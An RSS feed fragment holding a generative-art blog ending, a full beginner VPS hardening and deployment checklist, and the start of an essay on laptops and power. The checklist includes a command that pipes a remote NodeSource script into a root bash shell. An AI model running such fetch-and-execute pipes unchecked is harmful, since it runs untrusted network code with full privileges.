    &lt;p&gt;The second reason is due to Hilbert sorting. Each of our lines is sorted independently of how the previous line was sorted. If a point’s small motion moves it into a different grid square, it can change the sorting order, which changes the Hobby curve even more.&lt;/p&gt;
    &lt;p&gt;If we sort the first line, and then keep that order of points for all the lines, the result has fewer jumps, but the Hobby curves still act unpredictably:&lt;/p&gt;
    &lt;head rend="h1"&gt;Colophon&lt;/head&gt;
    &lt;p&gt;This was all done with Python, using other people’s implementations of the hard parts: hobby.py, hilbertcurve, and super-simplex. My code is on GitHub (nedbat/fluidity), but it’s a mess. Think of it as a woodworking studio with half-finished pieces and wood chips strewn everywhere.&lt;/p&gt;
    &lt;p&gt;A lot of the learning and experimentation was in my Jupyter notebook. Part of the process for work like this is playing around with different values of tweakable parameters and seeds for the random numbers to get the effect you want, either artistic or pedagogical. The notebook shows some of the thumbnail galleries I used to pick the examples to show.&lt;/p&gt;
    &lt;p&gt;I went on to play with animations, which led to other learnings, but those will have to wait for another blog post.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45480414</guid><pubDate>Sun, 05 Oct 2025 10:14:40 +0000</pubDate></item><item><title>Beginner Guide to VPS Hetzner and Coolify</title><link>https://bhargav.dev/blog/VPS_Setup_and_Security_Checklist_A_Complete_Self_Hosting_Guide</link><description>&lt;doc fingerprint="fe08e21335a407ea"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;VPS Setup and Security Checklist: Complete Self-Hosting Guide for 2025&lt;/head&gt;
    &lt;p&gt;I set up my own VPS, documented every step, and ended up with a repeatable deployment pipeline. This is both a checklist for my future self and a guide for anyone curious about self-hosting. Along the way I'll explain why I picked Hetzner and Coolify, and how they compare with other options like DigitalOcean, AWS, Render, or Fly.io.&lt;/p&gt;
    &lt;p&gt;This comprehensive checklist covers every essential step for setting up a secure, production-ready VPS. Each section includes commands, verification steps, and troubleshooting tips based on real-world experience.&lt;/p&gt;
    &lt;head rend="h2"&gt;Pre-Setup Checklist&lt;/head&gt;
    &lt;p&gt;Before You Begin:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Choose your VPS provider (Hetzner recommended for price/performance)&lt;/item&gt;
      &lt;item&gt;Select server specifications (minimum 1GB RAM, 20GB storage)&lt;/item&gt;
      &lt;item&gt;Note down server IP address and root credentials&lt;/item&gt;
      &lt;item&gt;Prepare your local machine with SSH client&lt;/item&gt;
      &lt;item&gt;Have a strong password generator ready&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Picking the VPS provider&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Chose Hetzner Cloud (cheap, fast, reliable in Europe)&lt;/item&gt;
      &lt;item&gt;Alternatives I considered: &lt;list rend="ul"&gt;&lt;item&gt;DigitalOcean → smoother onboarding, great docs, slightly more expensive&lt;/item&gt;&lt;item&gt;AWS Lightsail → decent for small apps, but tied to AWS ecosystem (complex for beginners)&lt;/item&gt;&lt;item&gt;Linode → reliable, but Hetzner wins on price/performance&lt;/item&gt;&lt;item&gt;Render/Fly.io → easier PaaS, but more opinionated and costly at scale&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Why Hetzner?&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;2–3x cheaper for the same specs compared to DO/AWS&lt;/item&gt;
      &lt;item&gt;Strong European datacenter presence (latency advantage for my use case)&lt;/item&gt;
      &lt;item&gt;Transparent pricing and no surprise bills&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Initial Server Setup Checklist&lt;/head&gt;
    &lt;head rend="h4"&gt;First Login and System Updates&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Initial login as root&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;ssh root@your-server-ip&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Update package lists and upgrade system&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;apt update &amp;amp;&amp;amp; apt upgrade -y&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Verify system information&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;uname -a cat /etc/os-release&lt;/code&gt;&lt;/quote&gt;
    &lt;head rend="h4"&gt;Root Account Security&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Change root password&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;passwd&lt;/code&gt;&lt;/quote&gt;
    &lt;code&gt;- Use strong password with mixed case, numbers, symbols
- Store securely in password manager
&lt;/code&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Create secondary user account&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;adduser your-username&lt;/code&gt;&lt;/quote&gt;
    &lt;code&gt;- Choose descriptive username (not 'admin' or 'user')
- Set strong password
&lt;/code&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Add user to sudo group&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;usermod -aG sudo your-username&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Verify user groups&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;groups your-username&lt;/code&gt;&lt;/quote&gt;
    &lt;code&gt;- Should show: `your-username : your-username sudo`
&lt;/code&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Test sudo access&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;su - your-username sudo whoami&lt;/code&gt;&lt;/quote&gt;
    &lt;code&gt;- Should return: `root`
&lt;/code&gt;
    &lt;head rend="h4"&gt;SSH Key Authentication Setup&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Generate SSH keys on LOCAL machine (not server)&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;#### Ed25519 (recommended) ssh-keygen -t ed25519 -C "your-email@example.com" ##### Or RSA if Ed25519 not supported ssh-keygen -t rsa -b 4096 -C "your-email@example.com"&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Display public key on local machine&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;cat ~/.ssh/id_ed25519.pub #### or cat ~/.ssh/id_rsa.pub&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Copy public key to clipboard&lt;/item&gt;
      &lt;item&gt;Create .ssh directory on server (as your user, not root)&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;mkdir -p ~/.ssh chmod 700 ~/.ssh&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Create authorized_keys file&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;nano ~/.ssh/authorized_keys&lt;/code&gt;&lt;/quote&gt;
    &lt;code&gt;- Paste your public key
- Save and exit
&lt;/code&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Set correct permissions&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;chmod 600 ~/.ssh/authorized_keys&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Test SSH key login (from local machine)&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;ssh your-username@your-server-ip&lt;/code&gt;&lt;/quote&gt;
    &lt;code&gt;- Should login without password prompt
&lt;/code&gt;
    &lt;head rend="h4"&gt;Disable Password Authentication&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Edit SSH configuration&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;sudo nano /etc/ssh/sshd_config&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Modify these settings:&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;PasswordAuthentication no PubkeyAuthentication yes&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Check cloud-init config if exists&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;sudo nano /etc/ssh/sshd_config.d/50-cloud-init.conf&lt;/code&gt;&lt;/quote&gt;
    &lt;code&gt;- Set `PasswordAuthentication no` here too if file exists
&lt;/code&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Test SSH configuration&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;sudo sshd -t&lt;/code&gt;&lt;/quote&gt;
    &lt;code&gt;- Should show no errors
&lt;/code&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Restart SSH service&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;sudo systemctl restart ssh #### or sudo service ssh restart&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Verify service status&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;sudo systemctl status ssh&lt;/code&gt;&lt;/quote&gt;
    &lt;code&gt;- Should show active (running) with green dot
&lt;/code&gt;
    &lt;head rend="h4"&gt;Disable Root Login&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Edit SSH configuration&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;sudo nano /etc/ssh/sshd_config&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Change root login setting&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;PermitRootLogin no&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Restart SSH service&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;sudo systemctl restart ssh&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Test root login is blocked (from another terminal)&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;ssh root@your-server-ip&lt;/code&gt;&lt;/quote&gt;
    &lt;code&gt;- Should get "Permission denied"
&lt;/code&gt;
    &lt;head rend="h2"&gt;Firewall Configuration Checklist&lt;/head&gt;
    &lt;head rend="h4"&gt;UFW (Uncomplicated Firewall) Setup&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Check UFW status&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;sudo ufw status&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Set default policies&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;sudo ufw default deny incoming sudo ufw default allow outgoing&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Allow SSH before enabling firewall&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;sudo ufw allow ssh #### or if you changed SSH port: sudo ufw allow 2022/tcp&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Allow HTTP and HTTPS for web apps&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;sudo ufw allow 80/tcp sudo ufw allow 443/tcp&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Enable firewall&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;sudo ufw enable&lt;/code&gt;&lt;/quote&gt;
    &lt;code&gt;- Type 'y' when prompted
&lt;/code&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Verify firewall rules&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;sudo ufw status verbose&lt;/code&gt;&lt;/quote&gt;
    &lt;head rend="h4"&gt;Advanced Firewall Configuration&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Restrict SSH to your IP (optional but recommended)&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;sudo ufw allow from YOUR_IP_ADDRESS to any port 22 sudo ufw delete allow ssh&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Change default SSH port (optional security through obscurity)&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;sudo nano /etc/ssh/sshd_config&lt;/code&gt;&lt;/quote&gt;
    &lt;code&gt;- Change `Port 22` to `Port 2022` (or your chosen port)
- Update firewall: `sudo ufw allow 2022/tcp`
- Remove old rule: `sudo ufw delete allow 22/tcp`
- Restart SSH: `sudo systemctl restart ssh`
&lt;/code&gt;
    &lt;head rend="h2"&gt;Automatic Updates Setup Checklist&lt;/head&gt;
    &lt;head rend="h4"&gt;Unattended Upgrades Configuration&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Install unattended-upgrades&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;sudo apt install unattended-upgrades apt-listchanges&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Enable automatic updates&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;sudo dpkg-reconfigure unattended-upgrades&lt;/code&gt;&lt;/quote&gt;
    &lt;code&gt;- Select "Yes" in the dialog
&lt;/code&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Configure update settings&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;sudo nano /etc/apt/apt.conf.d/50unattended-upgrades&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Uncomment security updates line&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;"${distro_id}:${distro_codename}-security";&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Configure email notifications (optional)&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;Unattended-Upgrade::Mail "your-email@example.com";&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Enable automatic reboots if needed&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;Unattended-Upgrade::Automatic-Reboot "true"; Unattended-Upgrade::Automatic-Reboot-Time "02:00";&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Test configuration&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;sudo unattended-upgrades --dry-run&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Check service status&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;sudo systemctl status unattended-upgrades&lt;/code&gt;&lt;/quote&gt;
    &lt;head rend="h2"&gt;Production Application Deployment Checklist&lt;/head&gt;
    &lt;head rend="h4"&gt;Node.js Production Setup&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Install Node.js LTS&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;curl -fsSL https://deb.nodesource.com/setup_lts.x | sudo -E bash - sudo apt-get install -y nodejs&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Verify installation&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;node --version npm --version&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Install PM2 globally&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;sudo npm install -g pm2&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Upload your application files&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;scp -r ./your-app your-username@your-server-ip:~/&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Install dependencies&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;cd ~/your-app npm install --production&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Create production build&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;npm run build&lt;/code&gt;&lt;/quote&gt;
    &lt;head rend="h4"&gt;Process Manager Configuration&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Start application with PM2&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;NODE_ENV=production pm2 start app.js --name "your-app"&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Configure PM2 for clustering (optional)&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;pm2 start app.js -i max --name "your-app-cluster"&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Save PM2 configuration&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;pm2 save&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Enable PM2 startup&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;pm2 startup #### Run the command it outputs&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Test application restart&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;pm2 restart all pm2 status&lt;/code&gt;&lt;/quote&gt;
    &lt;head rend="h4"&gt;Reverse Proxy Setup (Nginx)&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Install Nginx&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;sudo apt install nginx&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Create site configuration&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;sudo nano /etc/nginx/sites-available/your-app&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Basic Nginx configuration&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;server { listen 80; server_name your-domain.com; location / { proxy_pass http://localhost:3000; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection 'upgrade'; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_cache_bypass $http_upgrade; } }&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Enable site&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;sudo ln -s /etc/nginx/sites-available/your-app /etc/nginx/sites-enabled/&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Test Nginx configuration&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;sudo nginx -t&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Restart Nginx&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;sudo systemctl restart nginx&lt;/code&gt;&lt;/quote&gt;
    &lt;head rend="h2"&gt;SSL Certificate Setup Checklist&lt;/head&gt;
    &lt;head rend="h4"&gt;Let's Encrypt with Certbot&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Install Certbot&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;sudo apt install certbot python3-certbot-nginx&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Obtain SSL certificate&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;sudo certbot --nginx -d your-domain.com&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Test automatic renewal&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;sudo certbot renew --dry-run&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Verify SSL grade&lt;/item&gt;
      &lt;item&gt;Visit: https://www.ssllabs.com/ssltest/&lt;/item&gt;
      &lt;item&gt;Should get A or A+ rating&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Monitoring and Maintenance Checklist&lt;/head&gt;
    &lt;head rend="h4"&gt;Basic Monitoring Setup&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Install monitoring tools&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;sudo apt install htop iotop netstat-nat&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Check system resources&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;htop df -h free -h&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Monitor logs&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;sudo tail -f /var/log/syslog sudo tail -f /var/log/auth.log&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Set up log rotation&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;sudo nano /etc/logrotate.d/your-app&lt;/code&gt;&lt;/quote&gt;
    &lt;head rend="h4"&gt;Backup Strategy&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Create backup script&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;nano ~/backup.sh&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Sample backup script&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;#!/bin/bash DATE=$(date +%Y%m%d_%H%M%S) tar -czf ~/backups/app_backup_$DATE.tar.gz ~/your-app #### Add database backup commands if needed&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Make script executable&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;chmod +x ~/backup.sh&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Set up automated backups&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;crontab -e&lt;/code&gt;&lt;/quote&gt;
    &lt;code&gt;- Add: `0 2 * * * /home/username/backup.sh`
&lt;/code&gt;
    &lt;head rend="h2"&gt;Troubleshooting Checklist&lt;/head&gt;
    &lt;head rend="h4"&gt;Common Issues and Solutions&lt;/head&gt;
    &lt;p&gt;SSH Connection Problems:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Check firewall rules: &lt;code&gt;sudo ufw status&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Verify SSH service: &lt;code&gt;sudo systemctl status ssh&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Check SSH logs: &lt;code&gt;sudo tail -f /var/log/auth.log&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Test from different network&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Permission Denied Errors:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Check file permissions: &lt;code&gt;ls -la&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Verify user groups: &lt;code&gt;groups username&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Check sudo configuration: &lt;code&gt;sudo -l&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Service Not Starting:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Check service status: &lt;code&gt;sudo systemctl status service-name&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;View service logs: &lt;code&gt;sudo journalctl -u service-name&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Check configuration files syntax&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;High Resource Usage:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Identify processes: &lt;code&gt;htop&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Check disk usage: &lt;code&gt;df -h&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Monitor network: &lt;code&gt;netstat -tulpn&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Review application logs&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Final Verification Checklist&lt;/head&gt;
    &lt;head rend="h4"&gt;Security Verification&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Test SSH key authentication works&lt;/item&gt;
      &lt;item&gt;Verify password authentication is disabled&lt;/item&gt;
      &lt;item&gt;Confirm root login is blocked&lt;/item&gt;
      &lt;item&gt;Check firewall is active and configured&lt;/item&gt;
      &lt;item&gt;Verify automatic updates are working&lt;/item&gt;
      &lt;item&gt;Test application runs in production mode&lt;/item&gt;
      &lt;item&gt;Confirm SSL certificate is valid&lt;/item&gt;
      &lt;item&gt;Verify backups are being created&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h4"&gt;Performance Testing&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Run basic load test&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;#### Install Apache Bench sudo apt install apache2-utils #### Test with 100 requests, 10 concurrent ab -n 100 -c 10 http://your-domain.com/&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Monitor resource usage during load&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;htop&lt;/code&gt;&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Check application logs for errors&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;tsx&lt;code&gt;pm2 logs&lt;/code&gt;&lt;/quote&gt;
    &lt;head rend="h2"&gt;Quick Reference Commands&lt;/head&gt;
    &lt;p&gt;System Information:&lt;/p&gt;
    &lt;quote&gt;tsx&lt;code&gt;htop # System monitor df -h # Disk usage free -h # Memory usage uname -a # System info&lt;/code&gt;&lt;/quote&gt;
    &lt;p&gt;Process Management:&lt;/p&gt;
    &lt;quote&gt;tsx&lt;code&gt;pm2 status # PM2 process status pm2 restart all # Restart all processes pm2 logs # View logs pm2 monit # Real-time monitoring&lt;/code&gt;&lt;/quote&gt;
    &lt;p&gt;Security:&lt;/p&gt;
    &lt;quote&gt;tsx&lt;code&gt;sudo ufw status # Firewall status sudo fail2ban-client status # Fail2ban status sudo lynis audit system # Security audit&lt;/code&gt;&lt;/quote&gt;
    &lt;p&gt;Services:&lt;/p&gt;
    &lt;quote&gt;tsx&lt;code&gt;sudo systemctl status nginx # Service status sudo systemctl restart nginx # Restart service sudo journalctl -u nginx # Service logs&lt;/code&gt;&lt;/quote&gt;
    &lt;head rend="h2"&gt;Final thoughts&lt;/head&gt;
    &lt;p&gt;This checklist provides a complete approach to VPS setup and management. This isn’t just about saving money. It’s about control and understanding. By self-hosting with Hetzner + Coolify, I built muscle memory for devops that paid off in confidence and freedom.&lt;/p&gt;
    &lt;p&gt;If you’ve been meaning to try VPS hosting, consider this a nudge.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45480506</guid><pubDate>Sun, 05 Oct 2025 10:39:12 +0000</pubDate></item><item><title>Laptops create systems. Phones feed algorithms. The asymmetry determines power</title><link>https://zakelfassi.com/command-interface-device-power</link><description>&lt;doc fingerprint="b708bc1a9871a8d0"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Command Interface: How Your Device Choice Shapes Power Relations&lt;/head&gt;
    &lt;p&gt;Laptops create. Phones consume. The split determines who commands and who complies—a power dynamic hiding in plain sight across every interface we touch.&lt;/p&gt;
    &lt;p&gt;A 22-year-old designer I was considering for a project spent three hours editing a TikTok on her phone. Transitions, effects, music sync—all precision work. When I suggested she'd finish faster on a laptop, she looked at me like I'd proposed using a typewriter.&lt;/p&gt;
    &lt;p&gt;"Why would I need a laptop?"&lt;/p&gt;
    &lt;p&gt;Because laptops are command interfaces. Phones are consumption portals. The distinction matters more than anyone admits.&lt;/p&gt;
    &lt;p&gt;Not because phones can't create—they obviously can—but because the asymmetry between device types maps directly onto power structures we've stopped questioning. When you operate from a creation position, you gain command-and-control capabilities over people locked in consumption mode. The question isn't which device is "better." The question is: do you notice which mode you're operating from?&lt;/p&gt;
